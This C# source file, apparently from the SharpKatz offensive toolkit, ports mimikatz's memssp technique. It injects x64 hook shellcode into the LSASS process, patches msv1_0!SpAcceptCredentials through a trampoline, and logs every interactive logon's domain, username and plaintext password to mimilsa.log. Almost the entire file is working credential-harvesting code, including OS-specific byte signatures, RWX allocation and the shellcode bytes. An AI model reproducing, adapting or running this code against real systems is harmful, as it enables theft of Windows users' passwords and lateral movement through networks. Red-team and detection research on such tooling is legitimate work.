using System;
using System.Runtime.InteropServices;
using System.Text;
using SharpKatz.Win32;

namespace SharpKatz.Module
{
    /// <summary>
    /// misc::memssp — Patch msv1_0!SpAcceptCredentials in LSASS memory
    /// to log plaintext credentials to C:\Windows\System32\mimilsa.log
    ///
    /// Technique: memory-only hook (no DLL on disk, no registry, no reboot persistence)
    /// Based on mimikatz kuhl_m_misc_memssp
    ///
    /// The hook intercepts every interactive logon call to SpAcceptCredentials,
    /// extracts domain\user and password from SECPKG_PRIMARY_CRED, writes them
    /// to mimilsa.log via ntdll!NtCreateFile/NtWriteFile/NtClose, then calls
    /// through to the original function via trampoline.
    /// </summary>
    public static class MemSsp
    {
        // Pattern signatures for SpAcceptCredentials in msv1_0.dll (x64 only)
        // Selected by OS build number (highest matching minBuild wins)
        private static readonly PatternEntry[] SpAcceptPatterns = new PatternEntry[]
        {
            // Windows Vista / 7 / Server 2008 R2
            new PatternEntry(6000,
                new byte[] { 0x57, 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xD9, 0x49, 0x8B, 0xF8, 0x8B, 0xF1, 0x48 },
                14),
            // Windows 8.1 / Server 2012 R2
            new PatternEntry(9431,
                new byte[] { 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xD9, 0x49, 0x8B, 0xF8, 0x8B, 0xF1, 0x48 },
                14),    // need 14 bytes minimum for JMP [RIP+0] + 8-byte addr
            // Windows 10 1507-1703
            new PatternEntry(10240,
                new byte[] { 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xD9, 0x49, 0x8B, 0xF8, 0x8B, 0xF1, 0x48 },
                14),
            // Windows 10 1809+ / Server 2019 / Server 2022
            new PatternEntry(17763,
                new byte[] { 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xD9, 0x49, 0x8B, 0xF8, 0x8B, 0xF1, 0x48 },
                14),
        };

        // Pre-assembled x64 hook shellcode (523 bytes)
        // Assembled from memssp_hook.asm via NASM
        //
        // Placeholder addresses (patched at runtime before injection):
        //   0x4141414141414141 = NtCreateFile
        //   0x4242424242424242 = NtWriteFile
        //   0x4343434343434343 = NtClose
        //   0x4444444444444444 = Trampoline address
        //   0x4545454545454545 = (unused, was UNICODE_STRING)
        //   0x4646464646464646 = OBJECT_ATTRIBUTES address
        //   0x4747474747474747 = IO_STATUS_BLOCK address
        //   0x4848484848484848 = File handle storage address
        //   0x4949494949494949 = Format buffer address
        private static readonly byte[] HookShellcode = new byte[]
        {
            0x53, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xEC, 0x80,
            0x00, 0x00, 0x00, 0x89, 0xCB, 0x48, 0x89, 0xD5, 0x4C, 0x89, 0xC6, 0x4C, 0x89, 0xCF, 0x48, 0x85,
            0xF6, 0x0F, 0x84, 0xBA, 0x01, 0x00, 0x00, 0x66, 0x83, 0x7E, 0x28, 0x00, 0x0F, 0x84, 0xAF, 0x01,
            0x00, 0x00, 0x48, 0x83, 0x7E, 0x30, 0x00, 0x0F, 0x84, 0xA4, 0x01, 0x00, 0x00, 0x48, 0xB9, 0x48,
            0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xBA, 0x04, 0x00, 0x10, 0x00, 0x49, 0xB8, 0x46, 0x46,
            0x46, 0x46, 0x46, 0x46, 0x46, 0x46, 0x49, 0xB9, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47,
            0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00,
            0x00, 0xC7, 0x44, 0x24, 0x30, 0x03, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x38, 0x03, 0x00, 0x00,
            0x00, 0xC7, 0x44, 0x24, 0x40, 0x24, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00,
            0x00, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x41, 0x41, 0x41, 0x41,
            0x41, 0x41, 0x41, 0x41, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x88, 0x33, 0x01, 0x00, 0x00, 0x49, 0xBC,
            0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x49, 0x45, 0x31, 0xED, 0x0F, 0xB7, 0x4E, 0x08, 0xD1,
            0xE9, 0x4C, 0x8B, 0x46, 0x10, 0x4D, 0x85, 0xC0, 0x74, 0x21, 0x83, 0xF9, 0x7F, 0x76, 0x05, 0xB9,
            0x7F, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x74, 0x13, 0x41, 0x0F, 0xB6, 0x00, 0x43, 0x88, 0x04, 0x2C,
            0x49, 0xFF, 0xC5, 0x49, 0x83, 0xC0, 0x02, 0xFF, 0xC9, 0xEB, 0xE9, 0x43, 0xC6, 0x04, 0x2C, 0x5C,
            0x49, 0xFF, 0xC5, 0x48, 0x85, 0xED, 0x74, 0x30, 0x0F, 0xB7, 0x4D, 0x00, 0xD1, 0xE9, 0x4C, 0x8B,
            0x45, 0x08, 0x4D, 0x85, 0xC0, 0x74, 0x21, 0x83, 0xF9, 0x7F, 0x76, 0x05, 0xB9, 0x7F, 0x00, 0x00,
            0x00, 0x85, 0xC9, 0x74, 0x13, 0x41, 0x0F, 0xB6, 0x00, 0x43, 0x88, 0x04, 0x2C, 0x49, 0xFF, 0xC5,
            0x49, 0x83, 0xC0, 0x02, 0xFF, 0xC9, 0xEB, 0xE9, 0x43, 0xC6, 0x04, 0x2C, 0x09, 0x49, 0xFF, 0xC5,
            0x0F, 0xB7, 0x4E, 0x28, 0xD1, 0xE9, 0x4C, 0x8B, 0x46, 0x30, 0x4D, 0x85, 0xC0, 0x74, 0x24, 0x81,
            0xF9, 0xFF, 0x00, 0x00, 0x00, 0x76, 0x05, 0xB9, 0xFF, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x74, 0x13,
            0x41, 0x0F, 0xB6, 0x00, 0x43, 0x88, 0x04, 0x2C, 0x49, 0xFF, 0xC5, 0x49, 0x83, 0xC0, 0x02, 0xFF,
            0xC9, 0xEB, 0xE9, 0x43, 0xC6, 0x04, 0x2C, 0x0A, 0x49, 0xFF, 0xC5, 0x48, 0xB8, 0x48, 0x48, 0x48,
            0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x8B, 0x08, 0x31, 0xD2, 0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9,
            0x48, 0xB8, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x47, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4C,
            0x89, 0x64, 0x24, 0x28, 0x44, 0x89, 0x6C, 0x24, 0x30, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00,
            0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x42, 0x42, 0x42,
            0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0xB8, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48,
            0x48, 0x48, 0x8B, 0x08, 0x48, 0xB8, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0xFF, 0xD0,
            0x48, 0xB8, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x89, 0xD9, 0x48, 0x89, 0xEA, 0x49, 0x89, 0xF0, 0x49, 0x89, 0xF9, 0x48, 0x81, 0xC4, 0x80,
            0x00, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0x5B, 0x48,
            0xB8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0xFF, 0xE0,
        };

        // NT file path for mimilsa.log (\\??\C:\Windows\System32\mimilsa.log)
        private static readonly string LogFilePath = @"\??\C:\Windows\System32\mimilsa.log";

        /// <summary>
        /// Patch msv1_0!SpAcceptCredentials in LSASS to log credentials to mimilsa.log.
        /// Requires LSASS handle with VM read/write/operation access.
        /// </summary>
        /// <param name="hProcess">Handle to LSASS process</param>
        /// <param name="msv1Base">Base address of msv1_0.dll in LSASS</param>
        /// <param name="osBuild">Windows build number</param>
        /// <returns>true if patch succeeded</returns>
        public static bool PatchSpAcceptCredentials(IntPtr hProcess, IntPtr msv1Base, int osBuild)
        {
            Console.WriteLine("\n  [*] misc::memssp");
            Console.WriteLine("   [*] Patching msv1_0!SpAcceptCredentials in LSASS");

            // 1. Select pattern for this OS build
            PatternEntry pattern = null;
            for (int i = SpAcceptPatterns.Length - 1; i >= 0; i--)
            {
                if (osBuild >= SpAcceptPatterns[i].MinBuild)
                {
                    pattern = SpAcceptPatterns[i];
                    break;
                }
            }

            if (pattern == null)
            {
                Console.WriteLine("   [-] No SpAcceptCredentials signature for build {0}", osBuild);
                return false;
            }

            Console.WriteLine("   [*] Pattern for build >= {0}, prologue {1} bytes",
                pattern.MinBuild, pattern.PrologueLen);

            // 2. Find pattern in local copy of msv1_0.dll
            string sMsv = new string(new char[] { 'm', 's', 'v', '1', '_', '0', '.', 'd', 'l', 'l' });
            IntPtr localMsv = Natives.LoadLibrary(sMsv);
            if (localMsv == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Could not load msv1_0.dll locally");
                return false;
            }

            long moduleSize = GetModuleSize(localMsv);
            if (moduleSize == 0) moduleSize = 0x200000;

            ulong patternOffset = Utility.SearchPattern(localMsv, pattern.Pattern, moduleSize);
            if (patternOffset == 0)
            {
                Console.WriteLine("   [-] SpAcceptCredentials pattern not found in msv1_0.dll");
                return false;
            }

            Console.WriteLine("   [+] Pattern found at RVA 0x{0:X}", patternOffset);

            // 3. Calculate target address in LSASS
            IntPtr targetAddr = IntPtr.Add(msv1Base, (int)patternOffset);
            Console.WriteLine("   [+] SpAcceptCredentials in LSASS: 0x{0:X16}", targetAddr.ToInt64());

            // 4. Verify pattern matches in LSASS memory
            byte[] lsassBytes = Utility.ReadFromLsass(ref hProcess, targetAddr, pattern.PrologueLen);
            if (lsassBytes == null || lsassBytes.Length < pattern.Pattern.Length)
            {
                Console.WriteLine("   [-] Could not read LSASS memory at target address");
                return false;
            }

            for (int i = 0; i < pattern.Pattern.Length; i++)
            {
                if (lsassBytes[i] != pattern.Pattern[i])
                {
                    Console.WriteLine("   [-] Pattern mismatch at byte {0} in LSASS (expected 0x{1:X2}, got 0x{2:X2})",
                        i, pattern.Pattern[i], lsassBytes[i]);
                    Console.WriteLine("   [-] msv1_0.dll in LSASS may differ from local copy");
                    return false;
                }
            }

            Console.WriteLine("   [+] Pattern verified in LSASS memory");

            // 5. Resolve ntdll function addresses (same VA across all processes within boot session)
            IntPtr hNtdll = Natives.LoadLibrary("ntdll.dll");
            if (hNtdll == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Could not load ntdll.dll");
                return false;
            }

            IntPtr pNtCreateFile = Natives.GetProcAddress(hNtdll, "NtCreateFile");
            IntPtr pNtWriteFile = Natives.GetProcAddress(hNtdll, "NtWriteFile");
            IntPtr pNtClose = Natives.GetProcAddress(hNtdll, "NtClose");

            if (pNtCreateFile == IntPtr.Zero || pNtWriteFile == IntPtr.Zero || pNtClose == IntPtr.Zero)
            {
                Console.WriteLine("   [-] Could not resolve ntdll functions");
                return false;
            }

            Console.WriteLine("   [+] NtCreateFile: 0x{0:X16}", pNtCreateFile.ToInt64());
            Console.WriteLine("   [+] NtWriteFile:  0x{0:X16}", pNtWriteFile.ToInt64());
            Console.WriteLine("   [+] NtClose:      0x{0:X16}", pNtClose.ToInt64());

            // 6. Build the memory layout for injection
            //
            // Allocated region layout:
            //   [0x000 .. 0x20B]  Hook shellcode (523 bytes, padded to 0x210)
            //   [0x210 .. 0x2AF]  File path (WCHAR[]) — NT path for mimilsa.log
            //   [0x2B0 .. 0x2BF]  UNICODE_STRING for file path (16 bytes)
            //   [0x2C0 .. 0x2EF]  OBJECT_ATTRIBUTES (48 bytes)
            //   [0x2F0 .. 0x2FF]  IO_STATUS_BLOCK (16 bytes)
            //   [0x300 .. 0x307]  File handle storage (8 bytes)
            //   [0x310 .. 0x50F]  Format buffer (512 bytes)
            //   [0x510 .. 0x52F]  Trampoline: original prologue + JMP back

            const int OFFSET_SHELLCODE    = 0x000;
            const int OFFSET_FILEPATH     = 0x210;
            const int OFFSET_UNICODESTR   = 0x2B0;
            const int OFFSET_OBJATTR      = 0x2C0;
            const int OFFSET_IOSTATUS     = 0x2F0;
            const int OFFSET_FILEHANDLE   = 0x300;
            const int OFFSET_FORMATBUF    = 0x310;
            const int OFFSET_TRAMPOLINE   = 0x510;
            int totalSize = OFFSET_TRAMPOLINE + pattern.PrologueLen + 14 + 16; // trampoline + padding

            // 7. Allocate RWX memory in LSASS
            IntPtr allocBase = IntPtr.Zero;
            UIntPtr allocSize = new UIntPtr((uint)totalSize);

            Natives.NTSTATUS status = SysCall.NtAllocateVirtualMemory10(
                hProcess,
                ref allocBase,
                IntPtr.Zero,
                ref allocSize,
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x40    // PAGE_EXECUTE_READWRITE
            );

            if (status != Natives.NTSTATUS.Success || allocBase == IntPtr.Zero)
            {
                Console.WriteLine("   [-] NtAllocateVirtualMemory failed: 0x{0:X8}", (uint)status);
                return false;
            }

            long baseAddr = allocBase.ToInt64();
            Console.WriteLine("   [+] Allocated RWX at 0x{0:X16} ({1} bytes)", baseAddr, totalSize);

            // 8. Build data sections

            // File path as WCHAR[]
            byte[] filePathBytes = Encoding.Unicode.GetBytes(LogFilePath);
            int filePathByteLen = filePathBytes.Length;

            // UNICODE_STRING: Length(2) + MaxLength(2) + padding(4) + Buffer(8) = 16 bytes
            byte[] unicodeStr = new byte[16];
            BitConverter.GetBytes((ushort)filePathByteLen).CopyTo(unicodeStr, 0);          // Length
            BitConverter.GetBytes((ushort)(filePathByteLen + 2)).CopyTo(unicodeStr, 2);    // MaximumLength
            BitConverter.GetBytes(baseAddr + OFFSET_FILEPATH).CopyTo(unicodeStr, 8);       // Buffer pointer

            // OBJECT_ATTRIBUTES: Length(4) + pad(4) + RootDir(8) + ObjectName(8) + Attributes(4) + pad(4) + SD(8) + SQOS(8) = 48
            byte[] objAttr = new byte[48];
            BitConverter.GetBytes((uint)48).CopyTo(objAttr, 0);                            // Length
            // RootDirectory = NULL (offset 8)
            BitConverter.GetBytes(baseAddr + OFFSET_UNICODESTR).CopyTo(objAttr, 16);       // ObjectName pointer
            BitConverter.GetBytes((uint)0x40).CopyTo(objAttr, 24);                         // Attributes = OBJ_CASE_INSENSITIVE
            // SecurityDescriptor = NULL (offset 32)
            // SQOS = NULL (offset 40)

            // 9. Build trampoline: original prologue bytes + JMP [RIP+0] + return address
            int trampolineSize = pattern.PrologueLen + 6 + 8;
            byte[] trampoline = new byte[trampolineSize];
            Array.Copy(lsassBytes, 0, trampoline, 0, pattern.PrologueLen);

            // JMP [RIP+0] (FF 25 00 00 00 00) + absolute 8-byte address
            trampoline[pattern.PrologueLen + 0] = 0xFF;
            trampoline[pattern.PrologueLen + 1] = 0x25;
            trampoline[pattern.PrologueLen + 2] = 0x00;
            trampoline[pattern.PrologueLen + 3] = 0x00;
            trampoline[pattern.PrologueLen + 4] = 0x00;
            trampoline[pattern.PrologueLen + 5] = 0x00;
            // Return to: targetAddr + prologueLen (instruction after patched prologue)
            long returnAddr = targetAddr.ToInt64() + pattern.PrologueLen;
            BitConverter.GetBytes(returnAddr).CopyTo(trampoline, pattern.PrologueLen + 6);

            // 10. Patch shellcode with actual addresses
            byte[] shellcode = (byte[])HookShellcode.Clone();

            PatchPlaceholder(shellcode, 0x4141414141414141, pNtCreateFile.ToInt64()); // NtCreateFile
            PatchPlaceholder(shellcode, 0x4242424242424242, pNtWriteFile.ToInt64());  // NtWriteFile
            PatchPlaceholder(shellcode, 0x4343434343434343, pNtClose.ToInt64());      // NtClose
            PatchPlaceholder(shellcode, 0x4444444444444444, baseAddr + OFFSET_TRAMPOLINE); // Trampoline
            PatchPlaceholder(shellcode, 0x4646464646464646, baseAddr + OFFSET_OBJATTR);    // OBJECT_ATTRIBUTES
            PatchPlaceholder(shellcode, 0x4747474747474747, baseAddr + OFFSET_IOSTATUS);   // IO_STATUS_BLOCK
            PatchPlaceholder(shellcode, 0x4848484848484848, baseAddr + OFFSET_FILEHANDLE); // File handle
            PatchPlaceholder(shellcode, 0x4949494949494949, baseAddr + OFFSET_FORMATBUF);  // Format buffer

            // 11. Write all sections into LSASS
            Console.WriteLine("   [*] Writing hook components into LSASS...");

            // Shellcode
            if (!Utility.WriteToLsass(ref hProcess, IntPtr.Add(allocBase, OFFSET_SHELLCODE), shellcode))
            {
                Console.WriteLine("   [-] Failed to write hook shellcode");
                return false;
            }

            // File path
            if (!Utility.WriteToLsass(ref hProcess, IntPtr.Add(allocBase, OFFSET_FILEPATH), filePathBytes))
            {
                Console.WriteLine("   [-] Failed to write file path");
                return false;
            }

            // UNICODE_STRING
            if (!Utility.WriteToLsass(ref hProcess, IntPtr.Add(allocBase, OFFSET_UNICODESTR), unicodeStr))
            {
                Console.WriteLine("   [-] Failed to write UNICODE_STRING");
                return false;
            }

            // OBJECT_ATTRIBUTES
            if (!Utility.WriteToLsass(ref hProcess, IntPtr.Add(allocBase, OFFSET_OBJATTR), objAttr))
            {
                Console.WriteLine("   [-] Failed to write OBJECT_ATTRIBUTES");
                return false;
            }

            // Trampoline
            if (!Utility.WriteToLsass(ref hProcess, IntPtr.Add(allocBase, OFFSET_TRAMPOLINE), trampoline))
            {
                Console.WriteLine("   [-] Failed to write trampoline");
                return false;
            }

            Console.WriteLine("   [+] Hook components written successfully");

            // 12. Patch original SpAcceptCredentials prologue with JMP to hook
            // JMP [RIP+0] + absolute address of hook (14 bytes)
            byte[] jumpPatch = new byte[14];
            jumpPatch[0] = 0xFF;  // JMP [RIP+0]
            jumpPatch[1] = 0x25;
            jumpPatch[2] = 0x00;
            jumpPatch[3] = 0x00;
            jumpPatch[4] = 0x00;
            jumpPatch[5] = 0x00;
            BitConverter.GetBytes(baseAddr + OFFSET_SHELLCODE).CopyTo(jumpPatch, 6);

            if (!Utility.WriteToLsass(ref hProcess, targetAddr, jumpPatch))
            {
                Console.WriteLine("   [-] Failed to patch SpAcceptCredentials prologue!");
                Console.WriteLine("   [!] Attempting to restore original bytes...");
                Utility.WriteToLsass(ref hProcess, targetAddr, lsassBytes);
                return false;
            }

            Console.WriteLine();
            Console.WriteLine("   [+] SpAcceptCredentials patched successfully!");
            Console.WriteLine("   [+] Credentials will be logged to: C:\\Windows\\System32\\mimilsa.log");
            Console.WriteLine("   [*] Patch is memory-only — does not survive LSASS restart");
            Console.WriteLine("   [*] Format: domain\\user\\tpassword");

            return true;
        }

        /// <summary>
        /// Replace all occurrences of a 8-byte placeholder value in a byte array.
        /// </summary>
        private static void PatchPlaceholder(byte[] data, long placeholder, long value)
        {
            byte[] search = BitConverter.GetBytes(placeholder);
            byte[] replace = BitConverter.GetBytes(value);

            for (int i = 0; i <= data.Length - 8; i++)
            {
                bool found = true;
                for (int j = 0; j < 8; j++)
                {
                    if (data[i + j] != search[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found)
                {
                    Array.Copy(replace, 0, data, i, 8);
                    // Don't break — patch ALL occurrences (same placeholder used multiple times)
                }
            }
        }

        /// <summary>
        /// Get PE SizeOfImage from module base.
        /// </summary>
        private static long GetModuleSize(IntPtr moduleBase)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                return Marshal.ReadInt32(moduleBase, e_lfanew + 0x50);
            }
            catch
            {
                return 0;
            }
        }

        private class PatternEntry
        {
            public int MinBuild;
            public byte[] Pattern;
            public int PrologueLen;

            public PatternEntry(int minBuild, byte[] pattern, int prologueLen)
            {
                MinBuild = minBuild;
                Pattern = pattern;
                PrologueLen = prologueLen;
            }
        }
    }
}
